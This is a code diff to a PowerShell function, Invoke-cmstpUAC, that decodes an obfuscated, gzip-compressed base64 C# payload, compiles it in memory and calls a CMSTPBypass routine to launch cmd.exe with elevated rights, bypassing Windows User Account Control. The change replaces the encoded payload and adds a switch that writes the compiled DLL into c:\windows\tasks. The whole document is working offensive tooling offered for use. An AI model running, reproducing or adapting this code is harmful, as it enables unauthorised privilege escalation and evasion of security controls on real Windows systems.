@@ -1,11 +1,10 @@
 function Invoke-cmstpUAC {
     [CmdletBinding()]
     Param (
-        [String] $cmd = "c:\windows\system32\cmd.exe"
+        [String] $cmd = "c:\windows\system32\cmd.exe",
+        [Switch] $out
     )
-    # 
-    # gzip -c Source_obfs.cs | base64 -w0
-    $gzipB64 = "H4sICDULiWgAA1NvdXJjZV9vYmZzLmNzAI1XW2/aSBR+96+YtVrJFpZJSNPsLmUVLiZFhRRhWqoNqHLswYzqm8ZjIIr47z1jD/EF4pQHx5k55zv3i5OYBC4yn2KG/baUFP7T53jPKkejr5WDAbHcIIwZsePKTT/0ozDAAZuEDvZOLj0P24yEQazf4QBTYlcoFiRwwl0VdJYEjPhYHwUM0zAyMd0SGwMVkqLk0SM2sj0rjlF/Ys6nvacI3qVnCcEvomRrMYxiZoGy8Idy2FGwHljMQh10Kz9sMY1Bo5VkEjewWEJx5529Ibblhu+krrO1Ahs7o/thp6Vfg8CHAV5bicdGAWB63krqJzEL/QEGbwA7IHX4Cb/mZ2Zmb9fzvsUgSAJTphSbmCURuMq3AifunDkTbFze67cr6a47GQ1HxuDnojubdu8NiVnxr1/E81BzNEGT7qw3hsueYQxRc8jBalRbSR/+ubi40PjzssNPwc8/x4PRQBBq6IZDnLlZSbL8+ct4IssakmXz63AO+hjLCbFpGIdrthRhXfYTSiE3vmcuX3ajCE0ttomXJvYjTIdEJwHJUKY0XBMPCzdzquz8/bcA7yOQix2D0pC+z45lmetmpvEFU0SK3Fs+7sjy9+k93JubkDJza5cOkSTzNOK58jDwvBFkL2WKnIBHrlq643myukIiyUQSQX1gGqDHMPQQYO4y4xRIzimjaLMIHA2RgKGg7zv8Xm3XwWsIQju2YpZaAynJaILrZWI2DCl2aZgEzqlw9WjP+dzvTUGGbP+7XO5EUJZyu4Z+H3H6OMJXPms9yW3UbKI4LcurlgbPqIb3MeWNgFj37X3Ka/sxi3S8xzVsbsrWv5q1Jvqd8SOT2Z9M7mbgM+OHUcOKU9bnmTG/P2R8z8b93JgdzvGMScw+QaT+Q7sw+AWMAd4VDp8/atfapdbSoCa0K+1Guzq0OUrRCnT7eNYBOUp0FppDftA+AvglQF8D+N/azYErXLAT3bpvgLuvgLdSjTn4tdA501s4A93iN4A39Q4pgBYc8rYz/Ff0vQEfXwutP76AN5vHRKtHdc6iZniXFVU5apq1Uk0WQYXBiBhC+1HEiei889DYYzthWE25sxnDf4JsBjShzxl5kwGdeN+CUcfKF4qqm5FHmNIPAxg/TJ+H/Y1FFVmXVfXhYtWu4s4xbxwWfRoQ3iKghhu89Wyxp+wjjduv5jxZE+wlxHMwRV8TFiWMSxYuKl0rBb6cUofGjANHKYqtJZShidQSlO2vx4IZsJZftQdMyMf3qT3irsCeM+gzHHmWjRW5OjehC59EuB6hNLC0YzDcSOP1rr7BXBzMOfNjpO0qzKlfFpQwDFOXL2ZKwV/zMDNdUbWilPy4AERhfYD5cZY7ozqIgiiNnXTeCIf8aSmQtfJXKsHYQzHGSm/ayFOVNwC1wdOlUbVafUHIsQqqry0vxrlBh1fSQ9TtW7kuyI45Vyj4E/Ne5in/wVYCi2dsMotyjpA7SrxlEqsEf2x+seYFr96lbuLDvhTzoda0EiRD3R9VrwawzAornbnBniesAICKA4Wieqqp8sJYslZsFdmi8Bm88uLY7KYoukKUEej/w76e0zhhJbYVJghDts90Ya3cYiX30abiowPabXiYlTJCSS6Q50lS+rzQYX/ywXQI/Rf8lL0sLOjHQiCONLciUGQhX86O9XJ2yxIuq1oiakc4Pe2BlbIRVw8rBKFwMePDQ4QI5od4xXHvKR0gRaB2sfQyZn2MA5dtuEMu1KPuZ0OS0cPMge60pjjelKskNWbxJ/GvEOW4E4sExcuSuoua8NXqfW4JLoIV50e+oxcpNHR9Gt9TRQ+1i0KWL1khojutsH+M1ZPtIEmXUzkXuoaFX+GfCqRz0Ubk0xi+kOFTF14bDbVcKSkvPBroTjeTxwxRGT+QlXapnmuLwqAkejHjIP0GXmD4rfYPAAA=";
+    $gzipB64 = "H4sIAAAAAAAAA41WW2/aSBR+318xa7WSUSyXJCXZLqUS1xQVUoRpWW0cVY494FHsGWs8BqIo/71nxpNgG8PuCzLn8p3bN2cmSwldI+cpFThuo6zwz17gnaiIxt8rggHx1pSlgvhpRdNnccIopmLKAhwdKKMI+4Iwmto3mGJO/IrFktCAbaug84wKEmN7TAXmLHEw3xAfg1WSPUTER37kpSnqT53FrPeUyO/nV1UqPMgSbRgJ0HCH/UxgMxVcgkOqsUeDBdPyBniRlfnniETYHu5IKlKzNztzQrbBkblLrJjRx8aZ4brGq/AhsbZS2JC+Q7ohnNEYipfuwjxvtNELclS0XkaiAHM0piuJjzqI4m1ZZ4K5VtvdJME0MB0stMQ8yBasZ5xBG1JHeFzaMVmt/srxqwb/u572Hsru8nUmi0oB1PjgZchAZ2+JLlheg1ly+ZFiJ8RRpHMFx5UXpfgtY1tlZL45qMrFTHC0VQT4CpW+NSnXyAAVZa6w/wVOtFHAYAQVA2hfTqgukG6DzX2Voa7yBW1DOQ6z7FnCBrMyO+0R4zHUABP6hp/yj6UHA9f4OLHWGl/1aIAjDLQ7bJlKIOFk40GPNFM1OQuTP0FXrZqDnMXS+NaLZeEzT4RwwkRZYTZsJ4kgzz6jG8wFZNIPPW4attFo3DXv2694CwyHmHv8aUA4oPVmMPA9bQJZW7vC6++ZSDJxitp7i1d2F8PUGkhq1irKddX72oSujIM8ITXo68AT3rE8V4xjzw+RufE4NAQRirQHdHzvruNMCJUTarRf2gVse46TyPOxadx0p+PReDj4tezOZ93boWEdDrLe04HuYD4iUAcBL93/dWIlmlt1TtPuvDeBaL3hcLR3Khxr1aIlJwJ3o0iuerPQuj0zrSJ6ibAci4xTVOtVQ2d9rKsnURNNrwM1RKCz/nt3j2AxrLGQTNYLA8isP3Hae1JsLjq35ebOnewJpmsRykPcbLymW1oVuR0QHvq24jgNzf3+WZ7aPxXlHmfqEVpUqnSWJ1ZKbV7QJNgseM1ZBgtFeZdAJJlDtq3RWKi1H005kaMLJqdGPjp0Y6EJXHifCRVf0KTxtlmyRC59Q50KZIIWkU4Tqvs8gcscbmX4PDsDc2UHP2foxnayh9zbnNyReyu/BXVuWSL/3A2iaCzPvjCNLMX88sIOosho3FdzBX5i8HpgLCqWrmcVLmlgIZkU7ceB1EOoI9iW7O7ES8WQcyaXmuAZ/o+ANeMoRIZYFWfVwbz0L6i8ZUqqZ2Tcwf5N4R10D4kZDllTD9qDO+/8kPjemr2T4m6w8aiPg/HtqHNht6ToboBXXhbB1QAho0h597NUsHiA4TUGKIDZkRJpIWVO/t6Cww53Mk+lA7ymZhxDdVmiV1HaqZFpTxX2uFqlULPkDOGlj48kitCH8RQV1xL6MFKYJ7JUoB8/NZtNS/6ed6QCXn2/JoPxQNta6FrB1KiUu2t8/TaZuvDpGs730QJSG7rulPicpWwlXFdf5q7bzziH583PfCKuC4tdXaCgKu7gHAqWzgqWnh6ANMvl739QvEsgPg4Uw97nYtdQSeanLK9Lv17l2uq4xs/ZbW4D9OXC2fgV+csBy/TJhEsZTqb/t+tuXwsxjtnu1ClOE3wZi4sn7/Go4YMyTOCxY8f+7qjZWpn1L+cXU/tm+M9RO6zsnufDxe3LodF+4cjLqXhQlPD5ympZ59aFBSSwLq1r6/KwF3vrpBZCun60rgDkHCBaAPKXdX0KZn0E5kLlIGFap9zD04Wcco2PRL6G+ls6/tUpgKAWoAUVN61PKvbLH78BhBVexvcNAAA=";
     $gzipBytes = [Convert]::FromBase64String($gzipB64);
     $gzipMemoryStream = [IO.MemoryStream]::new($gzipBytes);
     $gzipStream = [IO.Compression.GzipStream]::new($gzipMemoryStream, [IO.Compression.CompressionMode]::Decompress)
@@ -13,8 +12,11 @@ function Invoke-cmstpUAC {
     $gzipStream.CopyTo($binaryMemoryStream);
     $reader = [IO.StreamReader]::new($binaryMemoryStream)
     $binaryMemoryStream.Position = 0
-    Add-Type -TypeDefinition $reader.ReadToEnd() -ReferencedAssemblies "System.Windows.Forms"
-    # Add-Type -TypeDefinition $reader.ReadToEnd() -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly c:\windows\tasks\doosey.dll
+    if ($out -eq $true) { 
+        Add-Type -TypeDefinition $reader.ReadToEnd() -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "c:\windows\tasks\doosey.dll"
+    } else {
+        Add-Type -TypeDefinition $reader.ReadToEnd() -ReferencedAssemblies "System.Windows.Forms"
+    }
     $gzipMemoryStream, $binaryMemoryStream, $reader | % {$_.Dispose()}
-    [CMSTPBypass]::Execute($cmd)
+    if ($out -eq $false) {[CMSTPBypass]::Execute($cmd)}
 }
